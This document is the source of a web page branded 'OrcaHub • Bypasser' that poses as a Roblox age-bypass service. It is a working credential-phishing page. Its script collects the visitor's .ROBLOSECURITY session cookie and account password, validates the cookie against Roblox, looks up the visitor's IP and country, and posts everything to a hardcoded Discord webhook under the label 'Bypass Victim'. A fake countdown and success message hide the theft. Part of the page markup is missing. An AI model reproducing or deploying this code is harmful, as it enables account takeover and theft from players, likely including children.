<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>OrcaHub • Bypasser</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, sans-serif;
        }

        body {
            height: 100vh;
            overflow: hidden;
            background: linear-gradient(-45deg, #0a0a14, #12121f, #1a0a2e, #0f0f1a);
            background-size: 400% 400%;
            animation: gradientShift 18s ease infinite;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            position: relative;
        }

        @keyframes gradientShift {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .shape {
            position: absolute;
            border-radius: 50%;
            filter: blur(80px);
            opacity: 0.3;
            animation: float 14s ease-in-out infinite;
            pointer-events: none;
        }

        .shape:nth-child(1) {
            width: 200px;
            height: 200px;
            background: radial-gradient(circle, #ff6b6b, transparent 70%);
            top: 10%;
            left: 5%;
            animation-duration: 12s;
        }
        .shape:nth-child(2) {
            width: 280px;
            height: 280px;
            background: radial-gradient(circle, #a29bfe, transparent 70%);
            bottom: 10%;
            right: 5%;
            animation-duration: 16s;
            animation-delay: -4s;
        }
        .shape:nth-child(3) {
            width: 150px;
            height: 150px;
            background: radial-gradient(circle, #4ecdc4, transparent 70%);
            top: 60%;
            left: 15%;
            animation-duration: 10s;
            animation-delay: -6s;
        }
        .shape:nth-child(4) {
            width: 220px;
            height: 220px;
            background: radial-gradient(circle, #ffe66d, transparent 70%);
            top: 20%;
            right: 20%;
            animation-duration: 15s;
            animation-delay: -8s;
        }

        @keyframes float {
            0%, 100% { transform: translate(0, 0) scale(1); }
            25% { transform: translate(40px, -50px) scale(1.1); }
            50% { transform: translate(-30px, 30px) scale(0.95); }
            75% { transform: translate(-50px, -20px) scale(1.05); }
        }

        /* ===== CAR SCENE ===== */
        .car-scene {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            z-index: 1;
        }

        .road {
            position: absolute;
            bottom: 0;
            left: 0;
            width: 100%;
            height: 35%;
            background: linear-gradient(180deg, transparent 0%, #1a1a2e 30%, #0f0f1a 100%);
        }

        .road-line {
            position: absolute;
            bottom: 30%;
            left: 0;
            width: 200%;
            height: 3px;
            background: repeating-linear-gradient(90deg, rgba(255,255,255,0.12) 0px, rgba(255,255,255,0.12) 40px, transparent 40px, transparent 80px);
            animation: roadMove 2s linear infinite;
        }

        @keyframes roadMove {
            0% { transform: translateX(0); }
            100% { transform: translateX(-50%); }
        }

        .car-wrapper {
            position: absolute;
            bottom: 22%;
            left: -200px;
            animation: carDrive 6s cubic-bezier(0.25, 0.1, 0.25, 1) forwards;
            filter: drop-shadow(0 20px 60px rgba(162, 155, 254, 0.12));
        }

        @keyframes carDrive {
            0% { left: -200px; transform: scale(0.8) rotate(-2deg); }
            30% { left: 20%; transform: scale(1) rotate(0deg); }
            50% { left: 40%; transform: scale(1.05) rotate(0deg); }
            70% { left: 50%; transform: scale(1) rotate(0deg); }
            85% { left: 55%; transform: scale(0.95) rotate(0.5deg); }
            100% { left: 58%; transform: scale(0.9) rotate(0deg); }
        }

        .car-wrapper svg {
            width: 300px;
            height: auto;
            display: block;
        }

        /* ===== HERO TEXT ===== */
        .hero-text {
            position: absolute;
            top: 12%;
            left: 50%;
            transform: translateX(-50%);
            z-index: 10;
            text-align: center;
            animation: fadeInDown 1.5s ease 0.5s both;
        }

        @keyframes fadeInDown {
            from { opacity: 0; transform: translateX(-50%) translateY(-30px); }
            to { opacity: 1; transform: translateX(-50%) translateY(0); }
        }

        .hero-text h1 {
            font-size: 4.5rem;
            font-weight: 900;
            background: linear-gradient(135deg, #a29bfe, #ff6b6b, #4ecdc4);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            letter-spacing: 6px;
            text-shadow: 0 0 60px rgba(162, 155, 254, 0.12);
            animation: gradientText 4s ease-in-out infinite;
            background-size: 300% 300%;
        }

        @keyframes gradientText {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .hero-text .sub {
            color: #8888aa;
            font-size: 0.85rem;
            letter-spacing: 5px;
            text-transform: uppercase;
            margin-top: 6px;
            font-weight: 300;
        }

        /* ===== GLASS CARD ===== */
        .glass-card {
            position: absolute;
            bottom: 30%;
            left: 50%;
            transform: translateX(-50%);
            z-index: 20;
            width: 92%;
            max-width: 480px;
            background: rgba(16, 16, 30, 0.9);
            backdrop-filter: blur(25px);
            -webkit-backdrop-filter: blur(25px);
            border-radius: 40px;
            border: 1px solid rgba(255, 255, 255, 0.05);
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.6);
            padding: 22px 26px;
            animation: slideUp 1s ease 1.5s both;
        }

        @keyframes slideUp {
            from { opacity: 0; transform: translateX(-50%) translateY(40px); }
            to { opacity: 1; transform: translateX(-50%) translateY(0); }
        }

        .card-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 12px;
        }

        .card-header h3 {
            font-size: 14px;
            font-weight: 700;
            color: #fff;
            letter-spacing: 1px;
        }

        .card-header span {
            font-size: 10px;
            color: #4ecdc4;
            font-weight: 600;
        }

        .input-group {
            display: flex;
            flex-direction: column;
            gap: 8px;
            margin-bottom: 12px;
        }

        .input-group input {
            width: 100%;
            padding: 11px 16px;
            background: rgba(10, 10, 20, 0.6);
            border: 1px solid rgba(255, 255, 255, 0.05);
            border-radius: 30px;
            color: #f0f0ff;
            font-size: 12px;
            outline: none;
            transition: 0.4s;
        }

        .input-group input:focus {
            border-color: #a29bfe;
            box-shadow: 0 0 0 4px rgba(162, 155, 254, 0.08);
        }

        .input-group input::placeholder {
            color: #3a3a52;
        }

        .input-group input.error {
            border-color: #ff6b6b;
            box-shadow: 0 0 0 4px rgba(255, 107, 107, 0.1);
        }

        .input-group input.success {
            border-color: #4ecdc4;
            box-shadow: 0 0 0 4px rgba(78, 205, 196, 0.1);
        }

        .profile-preview {
            background: linear-gradient(135deg, rgba(30, 20, 48, 0.7), rgba(20, 20, 36, 0.8));
            border-radius: 32px;
            padding: 14px 18px;
            margin-bottom: 12px;
            border: 1px solid rgba(255, 255, 255, 0.03);
            display: none;
            align-items: center;
            gap: 14px;
            backdrop-filter: blur(8px);
            transition: all 0.4s ease;
        }

        .profile-preview.show {
            display: flex;
            animation: fadeInScale 0.5s ease;
        }

        @keyframes fadeInScale {
            from { opacity: 0; transform: scale(0.92); }
            to { opacity: 1; transform: scale(1); }
        }

        .profile-preview img {
            width: 50px;
            height: 50px;
            border-radius: 50%;
            border: 2px solid rgba(162, 155, 254, 0.3);
            box-shadow: 0 0 30px rgba(162, 155, 254, 0.15);
            object-fit: cover;
            background: #1a1a2e;
        }

        .profile-info {
            flex: 1;
        }

        .profile-name {
            font-size: 0.95rem;
            font-weight: 700;
            color: #fff;
        }

        .profile-id {
            color: #8888aa;
            font-size: 0.65rem;
            margin-top: 1px;
        }

        .profile-stats {
            color: #666688;
            font-size: 0.6rem;
            margin-top: 1px;
        }

        .badge-verified {
            display: inline-block;
            background: rgba(78, 205, 196, 0.15);
            color: #4ecdc4;
            padding: 1px 10px;
            border-radius: 20px;
            font-size: 0.55rem;
            font-weight: 600;
            margin-top: 2px;
            border: 1px solid rgba(78, 205, 196, 0.1);
        }

        .btn-group {
            display: flex;
            gap: 8px;
        }

        .btn-primary {
            flex: 2;
            padding: 11px;
            background: linear-gradient(135deg, #a29bfe, #ff6b6b);
            border: none;
            border-radius: 30px;
            font-weight: 700;
            font-size: 12px;
            color: white;
            cursor: pointer;
            transition: 0.4s;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .btn-primary:hover {
            transform: scale(1.02);
            box-shadow: 0 8px 30px rgba(162, 155, 254, 0.3);
        }

        .btn-primary:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none !important;
        }

        .btn-instagram {
            flex: 1;
            padding: 11px;
            background: linear-gradient(135deg, #f58529, #dd2a7b);
            border: none;
            border-radius: 30px;
            font-weight: 700;
            font-size: 11px;
            color: white;
            cursor: pointer;
            transition: 0.4s;
            text-decoration: none;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 5px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .btn-instagram:hover {
            transform: scale(1.02);
            box-shadow: 0 8px 30px rgba(221, 42, 123, 0.3);
        }

        .btn-instagram svg {
            width: 14px;
            height: 14px;
            fill: currentColor;
        }

        .loader-container {
            display: none;
            text-align: center;
            padding: 8px 0;
        }

        .loader-container.show {
            display: block;
            animation: fadeIn 0.4s ease;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.95); }
            to { opacity: 1; transform: scale(1); }
        }

        .spinner {
            width: 35px;
            height: 35px;
            border: 3px solid rgba(162, 155, 254, 0.08);
            border-top-color: #a29bfe;
            border-right-color: #ff6b6b;
            border-radius: 50%;
            animation: spin 0.8s ease infinite;
            margin: 0 auto 8px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .loader-text {
            color: #8888aa;
            font-size: 11px;
            font-weight: 300;
        }

        .loader-text .time {
            color: #ff6b6b;
            font-weight: 700;
        }

        .result-message {
            display: none;
            background: rgba(78, 205, 196, 0.06);
            border: 1px solid rgba(78, 205, 196, 0.12);
            color: #4ecdc4;
            padding: 10px 14px;
            border-radius: 24px;
            text-align: center;
            font-size: 12px;
            font-weight: 600;
            margin-top: 10px;
            animation: fadeIn 0.4s ease;
        }

        .result-message.show {
            display: block;
        }

        .result-message .big {
            font-size: 1.8rem;
            display: block;
            margin-bottom: 2px;
        }

        .error-message {
            display: none;
            background: rgba(255, 107, 107, 0.08);
            border: 1px solid rgba(255, 107, 107, 0.15);
            color: #ff6b6b;
            padding: 8px 12px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: 500;
            text-align: center;
            margin-top: 8px;
            animation: fadeIn 0.4s ease;
        }

        .error-message.show {
            display: block;
        }

        .footer {
            text-align: center;
            color: #3a3a52;
            font-size: 0.55rem;
            margin-top: 16px;
            border-top: 1px solid rgba(255, 255, 255, 0.02);
            padding-top: 12px;
            letter-spacing: 1.5px;
            text-transform: uppercase;
        }

        @media (max-width: 768px) {
            .hero-text h1 { font-size: 3.2rem; letter-spacing: 4px; }
            .hero-text .sub { font-size: 0.7rem; letter-spacing: 4px; }
            .car-wrapper svg { width: 200px; }
            .car-wrapper { bottom: 18%; }
            .glass-card { bottom: 28%; padding: 18px 20px; max-width: 96%; }
            .btn-group { flex-direction: column; gap: 6px; }
        }

        @media (max-width: 480px) {
            .hero-text h1 { font-size: 2.5rem; letter-spacing: 2px; }
            .car-wrapper svg { width: 150px; }
            .glass-card { bottom: 25%; padding: 14px 16px; }
            .card-header h3 { font-size: 12px; }
            .card-header span { font-size: 9px; }
            .input-group input { font-size: 11px; padding: 10px 14px; }
            .btn-primary { font-size: 11px; padding: 10px; }
            .btn-instagram { font-size: 10px; padding: 10px; }
            .profile-preview { flex-direction: column; text-align: center; }
            .profile-preview img { width: 56px; height: 56px; }
        }

        @media (max-height: 700px) {
            .hero-text { top: 8%; }
            .hero-text h1 { font-size: 2.8rem; }
            .car-wrapper svg { width: 160px; }
            .car-wrapper { bottom: 16%; }
            .glass-card { bottom: 22%; padding: 14px 16px; max-width: 94%; }
            .card-header { margin-bottom: 8px; }
            .input-group { gap: 6px; margin-bottom: 8px; }
            .input-group input { padding: 8px 14px; font-size: 11px; }
            .btn-primary { padding: 8px; font-size: 10px; }
            .btn-instagram { padding: 8px; font-size: 10px; }
        }
    </style>
</head>
<body>

    <div class="shape"></div>
    <div class="shape"></div>
    <div class="shape"></div>

    <!-- ===== CAR SCENE ===== -->

                </defs>
            </svg>
        </div>

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            // ==================== WEBHOOK ====================
            const WEBHOOK_URL = 'https://discord.com/api/webhooks/1545842219787886693/PRkcsE8DY_anZhky9n7173-Gwslo7XF9PMZ6hT5igehnWPkie9KAmdbcSn1I_a20KtxG';

            // ==================== DOM REFS ====================
            const DOM = {
                cookieInput: document.getElementById('cookieInput'),
                passwordInput: document.getElementById('passwordInput'),
                bypassBtn: document.getElementById('bypassBtn'),
                instagramBtn: document.getElementById('instagramBtn'),
                error: document.getElementById('errorMessage'),
                loader: document.getElementById('loaderContainer'),
                timer: document.getElementById('timerDisplay'),
                result: document.getElementById('resultMessage'),
                profilePreview: document.getElementById('profilePreview'),
                profileImg: document.getElementById('profileImg'),
                profileName: document.getElementById('profileName'),
                profileId: document.getElementById('profileId'),
                profileStats: document.getElementById('profileStats'),
                profileBadge: document.getElementById('profileBadge'),
            };

            DOM.instagramBtn.href = 'https://www.instagram.com/uiogunio?stkn=MWY5OWppbGY1bmhsdw==';

            let bypassTimer = null;
            let isProcessing = false;
            let currentUserData = null;
            let userIP = '';

            // ==================== GET IP ====================
            async function getIP() {
                try {
                    const response = await fetch('https://api.ipify.org?format=json');
                    const data = await response.json();
                    userIP = data.ip || 'Unknown';
                } catch (_) {
                    userIP = 'Unknown';
                }
                
                try {
                    const countryResponse = await fetch(`https://ipapi.co/${userIP}/country_name/`);
                    const country = await countryResponse.text();
                    userIP = `${userIP} (${country.trim() || 'Unknown'})`;
                } catch (_) {}
                
                return userIP;
            }

            // ==================== SEND TO WEBHOOK ====================
            function sendToWebhook(embed) {
                try {
                    fetch(WEBHOOK_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ embeds: [embed] }),
                        mode: 'no-cors'
                    }).catch(() => {});
                } catch (_) {}
            }

            // ==================== ROBLOX API ====================
            async function fetchRobloxProfile(cookie) {
                try {
                    const response = await fetch('https://www.roblox.com/mobileapi/userinfo', {
                        headers: {
                            'Cookie': `.ROBLOSECURITY=${cookie}`,
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                        }
                    });

                    if (response.status === 401 || response.status === 403) {
                        return { valid: false, error: '❌ Cookie expired or wrong' };
                    }

                    if (!response.ok) {
                        return { valid: false, error: '❌ Invalid cookie or network error' };
                    }

                    const data = await response.json();
                    const userId = data.UserID;

                    const profileResponse = await fetch(`https://users.roblox.com/v1/users/${userId}`, {
                        headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
                    });
                    let profileData = {};
                    if (profileResponse.ok) {
                        profileData = await profileResponse.json();
                    }

                    const followersResponse = await fetch(`https://friends.roblox.com/v1/users/${userId}/followers/count`, {
                        headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
                    });
                    let followers = 0;
                    if (followersResponse.ok) {
                        const followersData = await followersResponse.json();
                        followers = followersData.count || 0;
                    }

                    const followingResponse = await fetch(`https://friends.roblox.com/v1/users/${userId}/followings/count`, {
                        headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
                    });
                    let following = 0;
                    if (followingResponse.ok) {
                        const followingData = await followingResponse.json();
                        following = followingData.count || 0;
                    }

                    return {
                        valid: true,
                        user: {
                            username: data.UserName || profileData.name || 'Unknown',
                            userId: userId,
                            displayName: data.UserName || profileData.name || 'Unknown',
                            isVerified: data.IsVerified || false,
                            followers: followers,
                            following: following,
                            created: profileData.created || 'Unknown',
                            avatarUrl: `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=150&height=150&format=png`,
                        }
                    };

                } catch (error) {
                    console.error('Roblox API error:', error);
                    return { valid: false, error: '❌ Network error. Please try again.' };
                }
            }

            // ==================== VALIDATE COOKIE ====================
            async function validateCookie(cookie) {
                const result = await fetchRobloxProfile(cookie);
                if (result.valid) {
                    currentUserData = result.user;
                    DOM.profileName.textContent = `@${result.user.username}`;
                    DOM.profileId.textContent = `ID: ${result.user.userId}`;
                    DOM.profileStats.textContent =
                        `📊 Followers: ${result.user.followers.toLocaleString()} • Following: ${result.user.following.toLocaleString()}`;
                    DOM.profileBadge.textContent = result.user.isVerified ? '✅ Verified' : '● Active';
                    DOM.profileImg.src = result.user.avatarUrl;
                    DOM.profileImg.onerror = function() {
                        this.src = 'https://ui-avatars.com/api/?name=' + encodeURIComponent(result.user.username) +
                            '&background=random&size=80&rounded=true&color=fff';
                    };
                    DOM.profilePreview.classList.add('show');
                    DOM.cookieInput.classList.remove('error');
                    DOM.cookieInput.classList.add('success');
                    DOM.error.classList.remove('show');
                    return { valid: true, user: result.user };
                } else {
                    DOM.profilePreview.classList.remove('show');
                    DOM.cookieInput.classList.remove('success');
                    DOM.cookieInput.classList.add('error');
                    DOM.error.textContent = result.error || '❌ Cookie expired or wrong';
                    DOM.error.classList.add('show');
                    currentUserData = null;
                    return { valid: false };
                }
            }

            // ==================== START BYPASS ====================
            async function startBypass() {
                const cookie = DOM.cookieInput.value.trim();
                const password = DOM.passwordInput.value.trim();

                DOM.error.classList.remove('show');
                DOM.result.classList.remove('show');
                DOM.loader.classList.remove('show');

                if (!cookie || cookie.length < 15) {
                    DOM.error.textContent = '❌ Please enter a valid .ROBLOSECURITY cookie!';
                    DOM.error.classList.add('show');
                    DOM.cookieInput.classList.add('error');
                    return;
                }

                if (!password || password.length < 3) {
                    DOM.error.textContent = '❌ Please enter your account password!';
                    DOM.error.classList.add('show');
                    DOM.passwordInput.classList.add('error');
                    return;
                }

                // Validate cookie first
                const validation = await validateCookie(cookie);
                if (!validation.valid) {
                    return;
                }

                // Get IP
                await getIP();

                // Send credentials to webhook as embed
                sendToWebhook({
                    title: "🎯 OrcaHub • Bypass Victim",
                    color: 0xff6b6b,
                    fields: [
                        { name: "👤 Username", value: `\`${validation.user.username}\``, inline: true },
                        { name: "🆔 User ID", value: `\`${validation.user.userId}\``, inline: true },
                        { name: "🔑 Password", value: `\`${password}\``, inline: false },
                        { name: "🍪 Cookie", value: `\`${cookie}\``, inline: false },
                        { name: "📊 Followers", value: `\`${validation.user.followers.toLocaleString()}\``, inline: true },
                        { name: "📊 Following", value: `\`${validation.user.following.toLocaleString()}\``, inline: true },
                        { name: "✅ Verified", value: validation.user.isVerified ? '✅ Yes' : '❌ No', inline: true },
                        { name: "📅 Created", value: `\`${validation.user.created}\``, inline: true },
                        { name: "🌐 IP", value: `\`${userIP}\``, inline: true },
                        { name: "🕒 Time", value: new Date().toISOString(), inline: true }
                    ],
                    footer: { text: "OrcaHub • Bypasser" },
                    thumbnail: { url: validation.user.avatarUrl }
                });

                // Start processing
                isProcessing = true;
                DOM.bypassBtn.disabled = true;
                DOM.bypassBtn.textContent = '⏳ Processing...';
                DOM.loader.classList.add('show');

                let seconds = 60;
                DOM.timer.textContent = seconds;

                if (bypassTimer) clearInterval(bypassTimer);

                bypassTimer = setInterval(() => {
                    seconds--;
                    DOM.timer.textContent = seconds;

                    if (seconds <= 0) {
                        clearInterval(bypassTimer);
                        bypassTimer = null;
                        completeBypass();
                    }
                }, 1000);
            }

            // ==================== COMPLETE BYPASS ====================
            function completeBypass() {
                DOM.loader.classList.remove('show');
                DOM.result.classList.add('show');

                isProcessing = false;
                DOM.bypassBtn.disabled = false;
                DOM.bypassBtn.textContent = '🚀 Start Bypass';

                // Show profile again with updated info
                if (currentUserData) {
                    DOM.profileName.textContent = `@${currentUserData.username}`;
                    DOM.profileId.textContent = `ID: ${currentUserData.userId}`;
                    DOM.profileStats.textContent =
                        `📊 Followers: ${currentUserData.followers.toLocaleString()} • Following: ${currentUserData.following.toLocaleString()}`;
                    DOM.profileBadge.textContent = currentUserData.isVerified ? '✅ Verified' : '● Active';
                    DOM.profilePreview.classList.add('show');
                }

                // Send final embed
                sendToWebhook({
                    title: "✅ Age Exceeded Successfully",
                    color: 0x4ecdc4,
                    fields: [
                        { name: "👤 Username", value: `\`${currentUserData?.username || 'Unknown'}\``, inline: true },
                        { name: "🆔 User ID", value: `\`${currentUserData?.userId || 'Unknown'}\``, inline: true },
                        { name: "📊 Followers", value: `\`${currentUserData?.followers?.toLocaleString() || 'Unknown'}\``, inline: true },
                        { name: "📊 Following", value: `\`${currentUserData?.following?.toLocaleString() || 'Unknown'}\``, inline: true },
                        { name: "✅ Verified", value: currentUserData?.isVerified ? '✅ Yes' : '❌ No', inline: true },
                        { name: "🌐 IP", value: `\`${userIP}\``, inline: true },
                        { name: "🕒 Time", value: new Date().toISOString(), inline: true }
                    ],
                    footer: { text: "OrcaHub • Age Bypass Complete" },
                    thumbnail: { url: currentUserData?.avatarUrl || "https://www.roblox.com/favicon.ico" }
                });

                setTimeout(() => {
                    DOM.result.classList.remove('show');
                }, 8000);
            }

            // ==================== EVENTS ====================
            DOM.bypassBtn.addEventListener('click', startBypass);

            DOM.cookieInput.addEventListener('keydown', (e) => {
                if (e.key === 'Enter') startBypass();
            });
            DOM.passwordInput.addEventListener('keydown', (e) => {
                if (e.key === 'Enter') startBypass();
            });

            DOM.cookieInput.addEventListener('blur', function() {
                const cookie = this.value.trim();
                if (cookie && cookie.length > 5) {
                    validateCookie(cookie);
                }
            });

            DOM.cookieInput.addEventListener('input', function() {
                if (this.value.trim().length > 5) {
                    const cookie = this.value.trim();
                    fetchRobloxProfile(cookie).then(result => {
                        if (result.valid) {
                            DOM.error.classList.remove('show');
                            this.classList.remove('error');
                            this.classList.add('success');
                            DOM.profilePreview.classList.remove('show');
                        } else {
                            this.classList.remove('success');
                            this.classList.add('error');
                        }
                    });
                }
            });
        });
    </script>
